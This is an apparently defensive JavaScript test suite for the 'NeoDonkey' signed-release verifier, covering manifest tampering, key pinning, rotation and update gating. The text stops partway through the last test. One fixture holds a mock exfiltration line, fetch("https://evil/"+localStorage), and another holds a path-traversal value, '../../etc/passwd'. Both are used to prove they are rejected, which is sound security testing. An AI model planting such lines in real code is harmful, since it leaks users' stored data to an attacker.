// test/h-release.test.js — the signed runtime, attacked.
//
// The claim under test is the one that decides whether NeoDonkey is sovereign software or a
// nicer-looking hyperscaler: **a compromised or compelled origin cannot change the code running
// on a machine that has installed once.** That is not a claim about happy paths, so most of this
// file is a tamper matrix. Every entry must fail, and every entry must fail with its OWN reason —
// a verifier that says "no" for the wrong reason is a verifier nobody can debug or trust.
//
// `node:fs` and `node:child_process` appear here only where a test needs the real repository or a
// second opinion from OpenSSH. The modules under test import neither; that is asserted.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFile, mkdtemp, rm } from 'node:fs/promises';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

import { generateIdentity, exportPublicSsh, exportPrivateJwk } from '../runtime/identity/ed25519.js';
import { signPayload } from '../runtime/identity/sshsig.js';
import {
  MANIFEST_SCHEMA, PRODUCT, RELEASE_NAMESPACE, ROTATION_NAMESPACE,
  canonicalBytes, canonicalManifestBytes, checkFile, compareVersions, describeOffer,
  inspectManifestUnverified, keyFingerprint, normalizeManifest, sha256Hex,
  verifyFile, verifyFileSet, verifyRelease,
} from '../runtime/release/manifest.js';
import {
  PIN_KEY, applyRotation, applyRotationChain, canonicalRotationBytes, checkAgainstPin,
  createRotationStatement, gateRelease, installedRelease, keyHistory, memoryStore,
  pinKey, pinnedKey, recordInstalledRelease,
} from '../runtime/release/pin.js';
import {
  classifyPath, collectReleaseFiles, renderManifestJson, signManifest, verifyWithSshKeygen,
} from '../release/sign-release.mjs';

const REPO = fileURLToPath(new URL('..', import.meta.url));
const repoPath = (rel) => join(REPO, rel);
const enc = new TextEncoder();

// ---------------------------------------------------------------------------------------------
// fixtures — a tiny synthetic "runtime" so the tests do not depend on the real repo's contents
// ---------------------------------------------------------------------------------------------

const SHELL = () => new Map([
  ['index.html', enc.encode('<!doctype html><script type="module" src="runtime/ui/boot.js"></script>')],
  ['runtime/ui/boot.js', enc.encode('import { open } from "../kernel.js";\n')],
  ['runtime/kernel.js', enc.encode('export const open = () => 42;\n')],
  ['manifest.webmanifest', enc.encode('{"name":"NeoDonkey"}')],
]);

async function entriesFor(files) {
  const out = [];
  for (const [path, bytes] of files) out.push({ path, sha256: await sha256Hex(bytes), bytes: bytes.length });
  return out;
}

/** Sign a manifest over a byte map. */
async function release(files, { version = '0.1.0', kp, key } = {}) {
  const keyPair = kp ?? await generateIdentity({ comment: 'release@neodonkey.eu' });
  const keyLine = key ?? await exportPublicSsh(keyPair);
  const manifest = await signManifest({ version, files: await entriesFor(files), key: keyLine }, keyPair);
  return { manifest, kp: keyPair, key: keyLine, text: renderManifestJson(manifest) };
}

const clone = (o) => JSON.parse(JSON.stringify(o));

// ---------------------------------------------------------------------------------------------
// 1. the happy path, and the foreign judge
// ---------------------------------------------------------------------------------------------

test('a signed release verifies, and every file in it verifies', async () => {
  const files = SHELL();
  const { manifest, key } = await release(files);

  const res = await verifyRelease(manifest, key);
  assert.equal(res.ok, true, res.reason);
  assert.equal(res.version, '0.1.0');
  assert.equal(res.files.size, 4);
  assert.equal(res.schema, MANIFEST_SCHEMA);

  for (const [path, bytes] of files) assert.equal(await verifyFile(path, bytes, res), true, path);
  const set = await verifyFileSet(files, res);
  assert.equal(set.ok, true, set.reason);
});

test('the manifest text round-trips through JSON exactly as the object did', async () => {
  const { text, key } = await release(SHELL());
  const res = await verifyRelease(text, key);
  assert.equal(res.ok, true, res.reason);
  // and the rendered text is valid, complete JSON with nothing appended
  assert.equal(text.endsWith('}\n'), true);
  assert.deepEqual(Object.keys(JSON.parse(text)).sort(),
    ['files', 'key', 'product', 'schema', 'signature', 'version']);
});

test('OpenSSH agrees: `ssh-keygen -Y verify` accepts our release signature', async () => {
  const { text } = await release(SHELL());
  const ssh = await verifyWithSshKeygen({ manifestText: text });
  if (!ssh.available) { console.log('    (ssh-keygen not installed — skipped)'); return; }
  assert.equal(ssh.ok, true, ssh.output);
  // It must be OpenSSH's own idea of the namespace, not just "a good signature".
  assert.match(ssh.output, /Good "neodonkey-release" signature/);
});

test('our key fingerprint is byte-identical to `ssh-keygen -lf`', async () => {
  const { key } = await release(SHELL());
  const mine = await keyFingerprint(key);
  let dir;
  try {
    dir = await mkdtemp(join(tmpdir(), 'nd-fp-'));
    const pub = join(dir, 'k.pub');
    await (await import('node:fs/promises')).writeFile(pub, `${key}\n`);
    const out = execFileSync('ssh-keygen', ['-lf', pub], { encoding: 'utf8' });
    assert.equal(out.split(/\s+/)[1], mine, `ssh-keygen said ${out.trim()}`);
  } catch (err) {
    if (err && err.code === 'ENOENT') { console.log('    (ssh-keygen not installed — skipped)'); return; }
    throw err;
  } finally { if (dir) await rm(dir, { recursive: true, force: true }); }
});

// ---------------------------------------------------------------------------------------------
// 2. the tamper matrix — every attack, and each one names itself
// ---------------------------------------------------------------------------------------------

// Two groups, and the split is a real property of the mechanism rather than an accident:
//
//   SIGNED-REGION mutations — a hash edited, the version edited, an entry deleted, a foreign
//   key's signature — are all the SAME fact: "the signature does not cover these bytes." They
//   are cryptographically indistinguishable, and inventing distinct reasons for them would mean
//   diffing the tampered manifest against something we trust, which by definition we do not
//   have. So they all report `bad-signature`, on purpose, and the test asserts exactly that.
//
//   STRUCTURAL defects — schema, product, fields, paths, namespace, JSON — are decided before
//   any signature is consulted, and each one gets its own reason so an operator can act on it.
//
// The attacks that *do* need fine-grained discrimination are the file-level ones (modified /
// added / removed), and those are in the next test, where they are distinct.

test('tamper matrix: every attack fails, each with its own distinct reason', async () => {
  const files = SHELL();
  const good = await release(files);
  const other = await generateIdentity({ comment: 'attacker' });
  const otherKey = await exportPublicSsh(other);
  const reasons = new Map();
  const signedRegion = new Set();
  const record = async (name, reason) => {
    assert.ok(typeof reason === 'string' && reason.length, `${name}: no reason given`);
    reasons.set(name, reason);
  };

  // --- attacks on the manifest itself -------------------------------------------------------
  {   // a hash edited inside the manifest
    const m = clone(good.manifest);
    m.files.find((f) => f.path === 'runtime/kernel.js').sha256 = 'f'.repeat(64);
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('manifest-hash-edited', r.reason);
  }
  {   // the version edited
    const m = clone(good.manifest); m.version = '9.9.9';
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('version-edited', r.reason);
  }
  {   // an entry removed from the manifest (so an unsigned file can take its place)
    const m = clone(good.manifest); m.files = m.files.filter((f) => f.path !== 'runtime/kernel.js');
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('manifest-entry-removed', r.reason);
  }
  {   // signature produced by a foreign key, manifest still claiming the real signer
    const m = clone(good.manifest);
    m.signature = await signPayload(other, canonicalManifestBytes(m), RELEASE_NAMESPACE);
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('signature-from-foreign-key', r.reason);
  }
  {   // a wholly valid release, signed by a key we do not trust (the compelled-origin case)
    const forged = await release(files, { kp: other, key: otherKey });
    const self = await verifyRelease(forged.manifest, otherKey);
    assert.equal(self.ok, true, 'the forgery is internally valid — that is the point');
    const r = await verifyRelease(forged.manifest, good.key);
    assert.equal(r.ok, false);
    await record('signed-by-untrusted-key', r.reason);
  }
  {   // a signature valid under namespace 'git' replayed as a release signature
    const m = clone(good.manifest);
    m.signature = await signPayload(good.kp, canonicalManifestBytes(m), 'git');
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('git-namespace-replay', r.reason);
  }
  {   // a rotation signature replayed as a release signature (the third namespace)
    const m = clone(good.manifest);
    m.signature = await signPayload(good.kp, canonicalManifestBytes(m), ROTATION_NAMESPACE);
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('rotation-namespace-replay', r.reason);
  }
  {   // unknown schema version — refused, never guessed at
    const m = clone(good.manifest); m.schema = 2;
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('unknown-schema', r.reason);
  }
  {   // a signed manifest from a different product, replayed at us
    const m = clone(good.manifest); m.product = 'someone-elses-app';
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('wrong-product', r.reason);
  }
  {   // an extra field, hoping it rides along unsigned
    const m = clone(good.manifest); m.allowUnsigned = 'yes';
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('unknown-field', r.reason);
  }
  {   // the signature simply removed
    const m = clone(good.manifest); delete m.signature;
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('signature-absent', r.reason);
  }
  {   // truncated JSON
    const r = await verifyRelease(good.text.slice(0, good.text.length - 20), good.key);
    assert.equal(r.ok, false);
    await record('truncated-json', r.reason);
  }
  {   // garbage
    const r = await verifyRelease('not json at all {{{', good.key);
    assert.equal(r.ok, false);
    assert.equal(r.reason, reasons.get('truncated-json'), 'both are malformed JSON');
  }
  {   // a JSON array instead of an object
    const r = await verifyRelease('[]', good.key);
    assert.equal(r.ok, false);
    await record('not-an-object', r.reason);
  }
  {   // an empty file list would "verify" while constraining nothing
    const m = clone(good.manifest); m.files = [];
    m.signature = await signPayload(good.kp, canonicalBytes('neodonkey-release-manifest/1',
      { schema: 1, product: PRODUCT, version: m.version, key: m.key, files: [] }), RELEASE_NAMESPACE);
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('empty-file-list', r.reason);
  }
  {   // path traversal in a manifest entry
    const m = clone(good.manifest); m.files[0].path = '../../etc/passwd';
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('bad-path', r.reason);
  }
  {   // two entries for the same file, differing only in case: one file on macOS, two URLs
    const m = clone(good.manifest);
    m.files.push({ ...m.files[0], path: m.files[0].path.toUpperCase() === m.files[0].path
      ? m.files[0].path.toLowerCase() : m.files[0].path.toUpperCase() });
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('duplicate-path-case', r.reason);
  }
  {   // an invisible character smuggled into a displayed field
    const m = clone(good.manifest); m.key = `${m.key}‮`;
    const r = await verifyRelease(m, good.key);
    assert.equal(r.ok, false);
    await record('non-ascii-field', r.reason);
  }
  {   // no expected key at all — a manifest never vouches for itself
    const r = await verifyRelease(good.manifest, undefined);
    assert.equal(r.ok, false);
    await record('no-expected-key', r.reason);
  }

  // Group A: mutations inside the signed region. All the same fact, all refused.
  for (const name of ['manifest-hash-edited', 'version-edited', 'manifest-entry-removed',
    'signature-from-foreign-key']) {
    assert.equal(reasons.get(name), 'bad-signature', name);
    signedRegion.add(name);
  }

  // Group B: structural defects, decided before the signature. Pairwise distinct, so an
  // operator reading a log can tell a stale schema from a replayed namespace from bad JSON.
  const structural = [...reasons].filter(([name]) => !signedRegion.has(name));
  const distinct = new Set(structural.map(([, reason]) => reason));
  assert.equal(distinct.size, structural.length,
    `structural reasons must be pairwise distinct, got ${JSON.stringify(structural)}`);
  assert.ok(structural.length >= 12, `expected a broad matrix, got ${structural.length}`);
  assert.equal(distinct.has('bad-signature'), false,
    'a structural defect must never be reported as a signature failure');

  // and the specific codes we promise the Service Worker and the UI:
  assert.equal(reasons.get('signed-by-untrusted-key'), 'key-mismatch');
  assert.equal(reasons.get('git-namespace-replay'), 'wrong-namespace:git');
  assert.equal(reasons.get('rotation-namespace-replay'), 'wrong-namespace:neodonkey-release-rotation');
  assert.equal(reasons.get('unknown-schema'), 'unknown-schema-version');
  assert.equal(reasons.get('unknown-field'), 'unknown-field:allowUnsigned');
  assert.equal(reasons.get('signature-absent'), 'missing-signature');
  assert.equal(reasons.get('truncated-json'), 'malformed-json');
  assert.equal(reasons.get('duplicate-path-case'), 'duplicate-path');
});

test('tamper matrix: attacks on the files, against a valid manifest', async () => {
  const files = SHELL();
  const { manifest, key } = await release(files);
  const res = await verifyRelease(manifest, key);
  assert.equal(res.ok, true);

  {   // one byte changed in a shipped module
    const tampered = new Map(files);
    tampered.set('runtime/kernel.js', enc.encode('export const open = () => 43;\n'));
    const r = await verifyFileSet(tampered, res);
    assert.equal(r.ok, false);
    assert.equal(r.reason, 'file-mismatch:runtime/kernel.js');
    assert.deepEqual(r.mismatched, ['runtime/kernel.js']);
    assert.equal((await checkFile('runtime/kernel.js', tampered.get('runtime/kernel.js'), res)).reason,
      'hash-mismatch');
  }
  {   // same length, different bytes — a size check alone would pass this
    const same = new Map(files);
    same.set('runtime/kernel.js', enc.encode('export const open = () => 24;\n'));
    assert.equal(same.get('runtime/kernel.js').length, files.get('runtime/kernel.js').length);
    assert.equal((await verifyFileSet(same, res)).reason, 'file-mismatch:runtime/kernel.js');
  }
  {   // a NEW file, not in the manifest. The attack that "verify what you fetch" misses.
    const added = new Map(files);
    added.set('runtime/ui/analytics.js', enc.encode('fetch("https://evil/"+localStorage);'));
    const r = await verifyFileSet(added, res);
    assert.equal(r.ok, false);
    assert.equal(r.reason, 'unlisted-file:runtime/ui/analytics.js');
    assert.equal(await verifyFile('runtime/ui/analytics.js', added.get('runtime/ui/analytics.js'), res), false);
    assert.equal((await checkFile('runtime/ui/analytics.js', new Uint8Array(1), res)).reason, 'unlisted-file');
  }
  {   // a file deleted — remove the module that enforces something
    const removed = new Map(files); removed.delete('runtime/kernel.js');
    const r = await verifyFileSet(removed, res);
    assert.equal(r.ok, false);
    assert.equal(r.reason, 'missing-file:runtime/kernel.js');
  }
  {   // mixed-version assembly: every file individually signed, the combination signed by nobody
    const v2files = new Map(files);
    v2files.set('runtime/kernel.js', enc.encode('export const open = () => 2;\n'));
    const v2 = await release(v2files, { version: '0.2.0' });
    const mixed = new Map(files);
    mixed.set('runtime/kernel.js', v2files.get('runtime/kernel.js'));
    assert.equal((await verifyFileSet(mixed, res)).ok, false,
      'a v1 manifest must not accept a v2 file, however genuinely signed the v2 release was');
    assert.equal(v2.manifest.version, '0.2.0');
  }
  {   // an unverified manifest is not a manifest
    assert.equal(await verifyFile('index.html', files.get('index.html'), { ok: false, reason: 'x' }), false);
    assert.equal((await verifyFileSet(files, null)).reason, 'no-verified-manifest');
  }
  {   // allowSubset relaxes `missing` and NOTHING else
    const subset = new Map([['index.html', files.get('index.html')]]);
    assert.equal((await verifyFileSet(subset, res, { allowSubset: true })).ok, true);
    subset.set('runtime/ui/evil.js', enc.encode('x'));
    assert.equal((await verifyFileSet(subset, res, { allowSubset: true })).reason,
      'unlisted-file:runtime/ui/evil.js');
  }
});

// ---------------------------------------------------------------------------------------------
// 3. canonical serialisation — order-independent and byte-stable
// ---------------------------------------------------------------------------------------------

test('canonical bytes are independent of key order and file order', async () => {
  const files = SHELL();
  const { manifest, key } = await release(files);
  const reference = canonicalManifestBytes(manifest);

  // permute the top-level keys
  const permuted = {};
  for (const k of ['signature', 'files', 'version', 'key', 'product', 'schema']) permuted[k] = manifest[k];
  assert.deepEqual(canonicalManifestBytes(permuted), reference);

  // permute the file list, and the keys inside each entry
  const shuffled = { ...manifest, files: manifest.files.slice().reverse().map((f) => ({
    bytes: f.bytes, sha256: f.sha256, path: f.path,
  })) };
  assert.deepEqual(canonicalManifestBytes(shuffled), reference);

  // several deterministic permutations, all identical
  for (let seed = 1; seed <= 8; seed++) {
    const files2 = manifest.files.slice();
    for (let i = files2.length - 1; i > 0; i--) {
      const j = (seed * (i + 7)) % (i + 1);
      [files2[i], files2[j]] = [files2[j], files2[i]];
    }
    assert.deepEqual(canonicalManifestBytes({ ...manifest, files: files2 }), reference);
  }

  // whitespace and key order in the JSON *text* are irrelevant too
  const reordered = JSON.stringify({ signature: manifest.signature, files: manifest.files.slice().reverse(),
    key: manifest.key, version: manifest.version, product: manifest.product, schema: manifest.schema }, null, 4);
  const r = await verifyRelease(reordered, key);
  assert.equal(r.ok, true, r.reason);
});

test('canonical bytes have the shape the signature relies on', async () => {
  const { manifest } = await release(SHELL());
  const bytes = canonicalManifestBytes(manifest);
  const text = new TextDecoder().decode(bytes);
  assert.equal(text.startsWith('neodonkey-release-manifest/1\n'), true, 'domain tag first');
  assert.equal(text.endsWith('}\n'), true, 'exactly one trailing newline');
  assert.equal(text.includes('\r'), false, 'never a CR');
  assert.equal(text.includes('\n{'), true);
  assert.equal(/[\x00-\x09\x0b-\x1f\x7f-￿]/.test(text.slice(29)), false, 'printable ASCII only');
  // A canonical manifest can never also be a git object: those start with `tree `/`blob `.
  assert.equal(text.startsWith('tree '), false);
  // the signature field is the only thing outside the signed region
  assert.equal(text.includes(manifest.signature.slice(40, 60)), false);
  assert.equal(text.includes(manifest.key), true, 'the signer key line IS signed');
  assert.equal(text.includes(`"schema":1`), true, 'the schema version IS signed');
});

test('canonical serialisation refuses the values that would make it ambiguous', async () => {
  const { manifest } = await release(SHELL());
  const bad = (mutate, reason) => {
    const m = clone(manifest); mutate(m);
    assert.throws(() => canonicalManifestBytes(m), (e) => e.reason === reason, `expected ${reason}`);
  };
  bad((m) => { m.files[0].bytes = 1.5; }, 'bad-size');
  bad((m) => { m.files[0].bytes = -1; }, 'bad-size');
  bad((m) => { m.files[0].bytes = 1e21; }, 'bad-size');
  bad((m) => { m.version = '1.0'; }, 'bad-version');
  bad((m) => { m.version = 'v1.0.0'; }, 'bad-version');
  bad((m) => { m.files[0].sha256 = 'ABCD'.repeat(16); }, 'bad-hash');      // uppercase hex is not canonical
  bad((m) => { m.files[0].path = 'runtime/./kernel.js'; }, 'bad-path');
  bad((m) => { m.files[0].path = '/index.html'; }, 'bad-path');
  bad((m) => { m.files[0].path = 'runtime\\ui\\app.js'; }, 'bad-path');
  bad((m) => { m.files[0].path = 'runtime/ui/app js'; }, 'bad-path');
  bad((m) => { m.key = 'ssh-rsa AAAA'; }, 'bad-key-line');
  bad((m) => { delete m.files[0].bytes; }, 'missing-field:bytes');

  // `__proto__` in the JSON is an own property, and our strict key check rejects it by name
  const polluted = JSON.parse('{"schema":1,"product":"neodonkey","version":"0.1.0","key":"x","files":[],"__proto__":{"schema":1}}');
  const r = await verifyRelease(polluted, 'x');
  assert.equal(r.ok, false);
  assert.equal(Object.prototype.hasOwnProperty.call({}, 'schema'), false, 'no prototype pollution');
});

test('normalizeManifest is a pure normalisation: sorted, stripped, unchanged input', async () => {
  const { manifest } = await release(SHELL());
  const before = JSON.stringify(manifest);
  const n = normalizeManifest(manifest);
  assert.equal(JSON.stringify(manifest), before, 'input must not be mutated');
  assert.equal('signature' in n, false, 'the signature is not part of the signed form');
  assert.deepEqual(n.files.map((f) => f.path), n.files.map((f) => f.path).slice().sort());
});

// ---------------------------------------------------------------------------------------------
// 4. pinning — trust on first use, then nothing but cryptography
// ---------------------------------------------------------------------------------------------

test('first use pins; the same key verifies; a different key is refused', async () => {
  const store = memoryStore();
  const a = await release(SHELL());
  const b = await release(SHELL());                       // a different signer entirely

  assert.equal(await pinnedKey(store), null);
  assert.equal((await checkAgainstPin(store, a.key)).reason, 'no-pin');

  await pinKey(store, a.key, { at: 1_700_000_000, origin: 'https://neodonkey.eu/' });
  assert.equal(await pinnedKey(store), a.key);
  assert.equal((await checkAgainstPin(store, a.key)).ok, true);
  assert.equal((await checkAgainstPin(store, b.key)).ok, false);
  assert.equal((await checkAgainstPin(store, b.key)).reason, 'key-not-pinned');

  // the pinned key verifies its own releases and refuses everyone else's
  assert.equal((await verifyRelease(a.manifest, await pinnedKey(store))).ok, true);
  assert.equal((await verifyRelease(b.manifest, await pinnedKey(store))).reason, 'key-mismatch');

  // idempotent, comment-insensitive
  await pinKey(store, `${a.key.split(' ').slice(0, 2).join(' ')} another-comment`);
  assert.equal(await pinnedKey(store), a.key, 'pinning the same key again changes nothing');

  // and there is no back door: pinKey cannot replace a pin
  await assert.rejects(() => pinKey(store, b.key), (e) => e.reason === 'already-pinned-to-a-different-key');
  assert.equal(await pinnedKey(store), a.key);

  assert.equal((await checkAgainstPin(store, 'ssh-ed25519 nonsense')).reason, 'bad-key-line');
  const fp = await keyFingerprint(a.key);
  assert.match(fp, /^SHA256:[A-Za-z0-9+/]{43}$/);
  assert.equal((await keyHistory(store))[0].fingerprint, fp);
});

test('a corrupt pin record is no pin at all (fail closed, never fail open)', async () => {
  const store = memoryStore();
  await store.set(PIN_KEY, { schema: 1, key: 'garbage' });
  assert.equal(await pinnedKey(store), null);
  await store.set(PIN_KEY, 'not even an object');
  assert.equal(await pinnedKey(store), null);
});

test('the store is injected: no browser API, any async get/set works', async () => {
  const calls = [];
  const backing = new Map();
  const store = {
    async get(k) { calls.push(['get', k]); return backing.get(k) ?? null; },
    async set(k, v) { calls.push(['set', k]); backing.set(k, v); },
  };
  const a = await release(SHELL());
  await pinKey(store, a.key);
  assert.equal(await pinnedKey(store), a.key);
  assert.ok(calls.some(([op, k]) => op === 'set' && k === PIN_KEY));
  await assert.rejects(() => pinKey({}, a.key), /async get/);
});

// ---------------------------------------------------------------------------------------------
// 5. key rotation — trust transfers cryptographically, and a human sees the fingerprint
// ---------------------------------------------------------------------------------------------

test('rotation: signed by the outgoing key, confirmed by fingerprint, then the new key rules', async () => {
  const store = memoryStore();
  const a = await release(SHELL());
  const b = await release(SHELL(), { version: '0.2.0' });
  await pinKey(store, a.key, { at: 1 });

  const statement = await createRotationStatement(a.kp, { from: a.key, to: b.key, note: 'annual rotation' });
  const fp = await keyFingerprint(b.key);

  // step 1: verified, NOT applied. The UI has to show this fingerprint first.
  const proposal = await applyRotation(store, statement);
  assert.equal(proposal.ok, true);
  assert.equal(proposal.applied, false);
  assert.equal(proposal.reason, 'confirmation-required');
  assert.equal(proposal.fingerprint, fp);
  assert.equal(proposal.previousFingerprint, await keyFingerprint(a.key));
  assert.equal(await pinnedKey(store), a.key, 'a proposal must not move the pin');

  // a wrong confirmation is not a confirmation
  const wrong = await applyRotation(store, statement, { confirmFingerprint: 'SHA256:whatever' });
  assert.equal(wrong.applied, false);
  assert.equal(await pinnedKey(store), a.key);

  // step 2: applied
  const applied = await applyRotation(store, statement, { confirmFingerprint: fp, at: 2 });
  assert.equal(applied.applied, true);
  assert.equal(await pinnedKey(store), b.key);

  // the new key's releases verify; the old key's no longer do
  assert.equal((await verifyRelease(b.manifest, await pinnedKey(store))).ok, true);
  assert.equal((await verifyRelease(a.manifest, await pinnedKey(store))).reason, 'key-mismatch');

  // the statement is inert once applied — `from` is no longer the pin (limit: no expiry, so this
  // check is what makes an old statement harmless)
  assert.equal((await applyRotation(store, statement, { confirmFingerprint: fp })).reason,
    'not-from-pinned-key');

  // auditable history
  const history = await keyHistory(store);
  assert.deepEqual(history.map((h) => h.why), ['first-use', 'rotation']);
  assert.deepEqual(history.map((h) => h.key), [a.key, b.key]);
  assert.equal(history[1].note, 'annual rotation');
  assert.equal(history[1].at, 2);
});

test('rotation: every forged path is refused, each with its own reason', async () => {
  const a = await release(SHELL());
  const b = await release(SHELL());
  const c = await release(SHELL());
  const fresh = async () => { const s = memoryStore(); await pinKey(s, a.key); return s; };
  const reasons = new Set();
  const refuse = async (store, statement, expected, expectPin = a.key) => {
    const r = await applyRotation(store, statement, { confirmFingerprint: await keyFingerprint(b.key) });
    assert.equal(r.applied, false, `expected refusal: ${expected}`);
    assert.equal(r.reason, expected);
    assert.equal(await pinnedKey(store), expectPin, 'the pin must not move');
    reasons.add(r.reason);
  };

  const good = await createRotationStatement(a.kp, { from: a.key, to: b.key });

  // an UNSIGNED rotation claim
  const { signature, ...unsigned } = good;
  await refuse(await fresh(), unsigned, 'missing-signature');

  // signed by a third party who is not the outgoing key
  const wrongSigner = { ...good,
    signature: await signPayload(c.kp, canonicalRotationBytes(good), ROTATION_NAMESPACE) };
  await refuse(await fresh(), wrongSigner, 'bad-signature');

  // signed correctly but over different content (`to` swapped after signing)
  await refuse(await fresh(), { ...good, to: c.key }, 'bad-signature');

  // right key, wrong namespace: a release signature replayed as a rotation
  const nsReplay = { ...good,
    signature: await signPayload(a.kp, canonicalRotationBytes(good), RELEASE_NAMESPACE) };
  await refuse(await fresh(), nsReplay, `wrong-namespace:${RELEASE_NAMESPACE}`);
  const gitReplay = { ...good,
    signature: await signPayload(a.kp, canonicalRotationBytes(good), 'git') };
  await refuse(await fresh(), gitReplay, 'wrong-namespace:git');

  // a statement that does not start from the key we trust (skipping a link in the chain)
  const foreign = await createRotationStatement(c.kp, { from: c.key, to: b.key });
  await refuse(await fresh(), foreign, 'not-from-pinned-key');

  // structural nonsense
  await refuse(await fresh(), { ...good, schema: 2 }, 'unknown-schema-version');
  await refuse(await fresh(), { ...good, product: 'other' }, 'wrong-product');
  await refuse(await fresh(), { ...good, extra: 1 }, 'unknown-field:extra');
  await refuse(await fresh(), '{{{ not json', 'malformed-json');
  await refuse(await fresh(), { ...good, to: good.from }, 'same-key');

  // rotation on a store with no pin at all — TOFU is pinKey's job, never rotation's
  await refuse(memoryStore(), good, 'no-pin', null);

  assert.ok(reasons.size >= 8, `reasons must discriminate, got ${[...reasons]}`);

  // and the signer cannot even build a statement with a key that is not the `from` key
  await assert.rejects(() => createRotationStatement(c.kp, { from: a.key, to: b.key }),
    (e) => e.reason === 'signing-key-is-not-the-from-key');
});

test('rotation chains: A→B→C transfers trust, and cannot skip B', async () => {
  const a = await release(SHELL());
  const b = await release(SHELL());
  const c = await release(SHELL());
  const ab = await createRotationStatement(a.kp, { from: a.key, to: b.key });
  const bc = await createRotationStatement(b.kp, { from: b.key, to: c.key });

  const store = memoryStore();
  await pinKey(store, a.key);
  const r = await applyRotationChain(store, [ab, bc], { confirmFingerprint: await keyFingerprint(c.key) });
  assert.equal(r.ok, true);
  assert.equal(r.applied, 2);
  assert.equal(await pinnedKey(store), c.key);
  assert.deepEqual((await keyHistory(store)).map((h) => h.key), [a.key, b.key, c.key]);

  // out of order: B→C first, from a pin of A, is refused and the pin does not budge
  const store2 = memoryStore();
  await pinKey(store2, a.key);
  const r2 = await applyRotationChain(store2, [bc, ab], { confirmFingerprint: await keyFingerprint(b.key) });
  assert.equal(r2.ok, false);
  assert.equal(r2.reason, 'not-from-pinned-key');
  assert.equal(r2.applied, 0);
  assert.equal(await pinnedKey(store2), a.key);
});

// ---------------------------------------------------------------------------------------------
// 6. the gate — what a loader is allowed to run
// ---------------------------------------------------------------------------------------------

test('gateRelease: four states, and the strip-the-signature attack fails after first install', async () => {
  const a = await release(SHELL());
  const b = await release(SHELL());

  // fresh install, no manifest on the origin: an unsigned development build. Named, not hidden.
  const dev = await gateRelease(memoryStore(), null);
  assert.equal(dev.mode, 'unsigned');
  assert.equal(dev.reason, 'no-release-manifest-and-no-pin');

  // fresh install with a manifest: trust on first use, fingerprint handed up for a human
  const store = memoryStore();
  const first = await gateRelease(store, a.text);
  assert.equal(first.mode, 'first-use');
  assert.equal(first.version, '0.1.0');
  assert.equal(first.fingerprint, await keyFingerprint(a.key));
  assert.equal(await pinnedKey(store), null, 'the gate must not pin by itself');

  await pinKey(store, first.key, { at: 1 });

  // pinned + valid manifest → verified, with the file allowlist
  const ok = await gateRelease(store, a.text);
  assert.equal(ok.mode, 'verified');
  assert.equal(ok.files.size, 4);

  // pinned + a manifest from another key → refused
  assert.equal((await gateRelease(store, b.text)).mode, 'refused');
  assert.equal((await gateRelease(store, b.text)).reason, 'key-mismatch');

  // pinned + NO manifest → refused. Removing release.json must not remove the protection.
  const stripped = await gateRelease(store, null);
  assert.equal(stripped.mode, 'refused');
  assert.equal(stripped.reason, 'release-manifest-missing');

  // pinned + tampered manifest → refused
  const t = clone(a.manifest); t.version = '9.9.9';
  assert.equal((await gateRelease(store, JSON.stringify(t))).reason, 'bad-signature');
});

test('inspectManifestUnverified reads claims and promises nothing', async () => {
  const a = await release(SHELL());
  const info = inspectManifestUnverified(a.text);
  assert.equal(info.ok, true);
  assert.equal(info.key, a.key);
  assert.equal(info.fileCount, 4);
  // it does not look at the signature at all — that is why the name says "unverified"
  const noSig = clone(a.manifest); delete noSig.signature;
  assert.equal(inspectManifestUnverified(noSig).ok, true);
  assert.equal(inspectManifestUnverified('{').reason, 'malformed-json');
});

// ---------------------------------------------------------------------------------------------
// 7. version coexistence (Appendix I) — an offer, never a mandate
// ---------------------------------------------------------------------------------------------

test('a newer release is an offer with a fingerprint, and never mandatory', async () => {
  const v1 = await release(SHELL(), { version: '0.1.0' });
  const v2files = SHELL(); v2files.set('runtime/kernel.js', enc.encode('export const open = () => 2;\n'));
  const v2 = await release(v2files, { version: '0.2.0', kp: v1.kp, key: v1.key });

  const offer = await describeOffer({ installedVersion: '0.1.0', offered: v2.text, pinnedKey: v1.key });
  assert.equal(offer.kind, 'update');
  assert.equal(offer.version, '0.2.0');
  assert.equal(offer.verified, true);
  assert.equal(offer.mandatory, false);
  assert.equal(offer.fingerprint, await keyFingerprint(v1.key));

  assert.equal((await describeOffer({ installedVersion: '0.2.0', offered: v2.text, pinnedKey: v1.key })).kind, 'same');
  // a rollback to a genuinely signed OLD release is reported as a downgrade, not as an update
  const back = await describeOffer({ installedVersion: '0.2.0', offered: v1.text, pinnedKey: v1.key });
  assert.equal(back.kind, 'downgrade');
  assert.equal(back.mandatory, false);
  // and a foreign key is simply unverified
  const other = await release(SHELL(), { version: '0.3.0' });
  const bad = await describeOffer({ installedVersion: '0.1.0', offered: other.text, pinnedKey: v1.key });
  assert.equal(bad.kind, 'unverified');
  assert.equal(bad.reason, 'key-mismatch');
  assert.equal(bad.mandatory, false);
});

test('the installed release is remembered, so v1 keeps running while v2 is on offer', async () => {
  const store = memoryStore();
  const v1 = await release(SHELL(), { version: '0.1.0' });
  const v2files = SHELL(); v2files.set('runtime/kernel.js', enc.encode('export const open = () => 2;\n'));
  const v2 = await release(v2files, { version: '0.2.0', kp: v1.kp, key: v1.key });

  await pinKey(store, v1.key, { at: 1 });
  await recordInstalledRelease(store, { manifestText: v1.text, at: 1 });

  // the origin now serves v2. Nothing about that changes what this installation runs.
  const installed = await installedRelease(store);
  assert.equal(installed.version, '0.1.0');
